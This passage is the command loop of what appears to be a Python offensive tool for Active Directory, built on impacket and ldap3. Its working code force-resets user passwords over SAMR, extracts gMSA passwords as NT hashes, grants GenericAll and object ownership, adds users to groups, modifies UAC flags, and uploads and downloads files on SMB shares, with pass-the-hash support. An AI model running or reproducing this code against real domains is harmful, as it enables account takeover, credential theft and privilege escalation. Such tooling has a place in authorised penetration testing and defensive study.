            args.ldaps = current_session.get("ldaps", False)
            args.kerberos = bool(os.environ.get("KRB5CCNAME"))

            try:
                from aclftw import aclftw
                aclftw.main(args)
            except Exception as e:
                print(f"[-] Error running aclftw: {e}")

        elif command[0] == "setpass":

            if len(command) < 3:
                print("setpass <user> <newpassword>")
                continue

            target_user = command[1]
            newpass = command[2]

            # Use SAMR protocol over SMB (port 445) - no SSL needed
            try:
                from impacket.dcerpc.v5 import samr, transport

                dc_ip = current_session["ip"]
                domain = current_session["domain"]
                sess_user = current_session["username"]
                sess_pass = current_session["password"]
                nthash = current_session.get("nthash", "")

                # Set up NTLM hashes for impacket
                lmhash = ""
                if nthash:
                    lmhash = "aad3b435b51404eeaad3b435b51404ee"
                    auth_pass = ""
                else:
                    auth_pass = sess_pass

                # Connect to SAMR over SMB (port 445)
                rpctransport = transport.SMBTransport(dc_ip, filename=r'\samr')
                rpctransport.set_credentials(sess_user, auth_pass, domain, lmhash, nthash)
                dce = rpctransport.get_dce_rpc()
                dce.connect()
                dce.bind(samr.MSRPC_UUID_SAMR)

                # Open the server and domain
                resp = samr.hSamrConnect(dce)
                server_handle = resp['ServerHandle']

                resp = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
                domains = resp['Buffer']['Buffer']

                # Find the domain (not Builtin)
                domain_name = None
                for d in domains:
                    if d['Name'].lower() != 'builtin':
                        domain_name = d['Name']
                        break

                if not domain_name:
                    print("[-] Could not find domain")
                    continue

                resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain_name)
                domain_sid = resp['DomainId']

                resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
                domain_handle = resp['DomainHandle']

                # Look up the target user
                resp = samr.hSamrLookupNamesInDomain(dce, domain_handle, [target_user])
                user_rid = resp['RelativeIds']['Element'][0]['Data']

                resp = samr.hSamrOpenUser(dce, domain_handle, samr.USER_FORCE_PASSWORD_CHANGE | samr.USER_READ_GENERAL, userId=user_rid)
                user_handle = resp['UserHandle']

                # Force-reset the password using hSamrSetNTInternal1
                # This handles all session-key crypto automatically
                samr.hSamrSetNTInternal1(dce, user_handle, newpass)

                print(f"[+] Password changed successfully for {target_user}")

                samr.hSamrCloseHandle(dce, user_handle)
                samr.hSamrCloseHandle(dce, domain_handle)
                samr.hSamrCloseHandle(dce, server_handle)
                dce.disconnect()

            except Exception as e:
                print(f"[-] Failed to change password: {e}")

        elif command[0] == "savepassword":

            if len(command) < 2:
                print("savepassword <password>")
                continue
            save_password(command[1])

        elif command[0] == "shares":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("Usage:")
                print("  shares <ip>                          - List all shares")
                print("  shares <ip> <share>                  - List files in share")
                print("  shares <ip> <share>\\<subdir>         - Browse subdirectory")
                print("  shares <ip> <share> get <file>       - Download file")
                print("  shares <ip> <share> put <localfile>  - Upload file")
                print("  (Use quotes for share names with spaces: \"Department Shares\")")
                continue
            target_ip = command[1]

            username = current_session.get("username")
            password = current_session.get("password")
            domain = current_session.get("domain")
            nthash = current_session.get("nthash")

            from shares import shares as shares_module

            if len(command) == 2:
                shares_module.main(target_ip, username, password, domain, nthash)
            else:
                action_idx = None
                for i in range(2, len(command)):
                    if command[i].lower() in ("get", "put"):
                        action_idx = i
                        break

                if action_idx is not None:
                    share_parts = command[2:action_idx]
                    action = command[action_idx].lower()
                    filename = command[action_idx + 1] if action_idx + 1 < len(command) else None

                    if not share_parts:
                        print("[-] Missing share name.")
                        continue
                    if not filename:
                        print(f"[-] Missing filename for '{action}'.")
                        continue

                    share_full = " ".join(share_parts)
                    if "\\" in share_full:
                        share = share_full.split("\\")[0]
                        subpath = "\\".join(share_full.split("\\")[1:])
                        filename = subpath + "\\" + filename
                    else:
                        share = share_full

                    if action == "get":
                        shares_module.download_file(target_ip, username, password, domain, share, filename, nthash)
                    elif action == "put":
                        shares_module.upload_file(target_ip, username, password, domain, share, filename, nthash)
                else:
                    share_full = " ".join(command[2:])

                    if "\\" in share_full:
                        parts = share_full.split("\\", 1)
                        share = parts[0].strip()
                        subpath = parts[1].strip().rstrip("\\") + "\\*"
                        shares_module.list_files(target_ip, username, password, domain, share, subpath, nthash)
                    else:
                        share = share_full
                        shares_module.list_files(target_ip, username, password, domain, share, "*", nthash)


            # try:
            #     from shares import shares as shares_module
            #     shares_module.main(
            #         target_ip,
            #         current_session.get("username"),
            #         current_session.get("password"),
            #         current_session.get("domain"),
            #         nthash=current_session.get("nthash")
            #     )
            # except Exception as e:
            #     print(f"[-] Error enumerating shares: {e}")

        elif command[0] == "get_sid":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("get_sid <username>")
                continue
            try:
                get_sid(current_session["conn"], current_session["base_dn"], command[1])
            except Exception as e:
                print(f"[-] Error getting SID: {e}")
        elif command[0] == "addmember":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 3:
                print("addmember <group_name> <username>")
                continue
            try:
                add_member(current_session["conn"], current_session["base_dn"], command[1], command[2])
            except Exception as e:
                print(f"[-] Error while add users: {e}")
        elif command[0] == "getgmsa":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("getgmsa <gmsa_account$>")
                continue
            target_gmsa = command[1]
            if not target_gmsa.endswith('$'):
                target_gmsa += '$'

            try:
                conn = current_session["conn"]
                base_dn = current_session["base_dn"]
                tmp_conn = None

                # If not LDAPS, we need an LDAPS connection to read the msDS-ManagedPassword
                if not current_session.get("ldaps", False):
                    tls = Tls(validate=ssl.CERT_NONE)
                    # use the same host used in the current connection (hostname or IP)
                    target_host = current_session["conn"].server.host
                    server = Server(target_host, port=636, use_ssl=True, get_info=ALL, tls=tls)
                    
                    if current_session.get("conn").sasl_mechanism == KERBEROS or "KRB5CCNAME" in os.environ:
                        tmp_conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
                    elif current_session.get("nthash"):
                        password = f"aad3b435b51404eeaad3b435b51404ee:{current_session['nthash']}"
                        tmp_conn = Connection(server, user=current_session["conn"].user, password=password, authentication=NTLM, auto_bind=True)
                    else:
                        tmp_conn = Connection(server, user=current_session["conn"].user, password=current_session["password"], authentication=NTLM, auto_bind=True)
                    
                    search_conn = tmp_conn
                else:
                    search_conn = conn

                search_conn.search(base_dn, f"(sAMAccountName={target_gmsa})", attributes=['msDS-ManagedPassword'])

                if not search_conn.entries:
                    print(f"[-] Could not find account: {target_gmsa}")
                    if tmp_conn: tmp_conn.unbind()
                    continue
                entry = search_conn.entries[0]

                if "msDS-ManagedPassword" not in entry or not entry["msDS-ManagedPassword"].raw_values:
                    print(f"[bold red][-] Failed! The attribute is empty or you lack 'ReadGmsaPassword' permissions.[/bold red]")
                    if tmp_conn: tmp_conn.unbind()
                    continue

                password_blob = entry["msDS-ManagedPassword"].raw_values[0]

                import struct
                import hashlib

                version, reserved, length, cur_off, prev_off, query_off, unch_off = struct.unpack('<HHLHHHH', password_blob[:16])

                # The current password ends where the next non-zero offset begins
                offsets = [o for o in [prev_off, query_off, unch_off] if o > cur_off]
                end_off = min(offsets) if offsets else len(password_blob)
                
                pwd_bytes = password_blob[cur_off:end_off]
                
                # Remove the trailing 2-byte null terminator for NT hash
                if len(pwd_bytes) >= 2:
                    pwd_bytes = pwd_bytes[:-2]

                nt_hash = hashlib.new('md4', pwd_bytes).hexdigest()

                print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
                print(f"[bold cyan]NT Hash: {nt_hash}[/bold cyan]")
                
                if tmp_conn:
                    tmp_conn.unbind()

            except Exception as e:
                print(f"[-] Error retrieving GMSA Password: {e}")

        elif command[0] == "setowner":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("setowner <target_account>")
                continue
            target = command[1]
            session_username = current_session["username"]

            try:
                cmd_setowner(current_session["conn"], current_session["base_dn"], target, session_username)
            except Exception as e:
                print(f"[-] Error setting owner : {e}")
        elif command[0] == "genericall":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("genericall <target_account>")
                continue
            target = command[1]
            session_username = current_session["username"]

            try:
                cmd_genericall(current_session["conn"], current_session["base_dn"], target, session_username)
            except Exception as e:
                print(f"[-] Error adding Genericall: {e}")
        elif command[0] == "adduac":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 3:
                print("adduac <targetname> <FLAG>")
                continue
            try:
                modify_uac(current_session["conn"], current_session["base_dn"], command[1], command[2].upper(), "add")
            except Exception as e:
                print(f"[-] Error modifying UAC: {e}")
        elif command[0] == "rmuac":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 3:
                print("rmuac <targetname> <FLAG>")
                continue
            try:
                modify_uac(current_session["conn"], current_session["base_dn"], command[1], command[2].upper(), "remove")
            except Exception as e:
                print(f"[-] Error modifying UAC: {e}")
        elif command[0] == "exit":
            break
        else:
            print("Unknown command. Type 'help' for available commands.")
if __name__ == "__main__":
    connect(None)
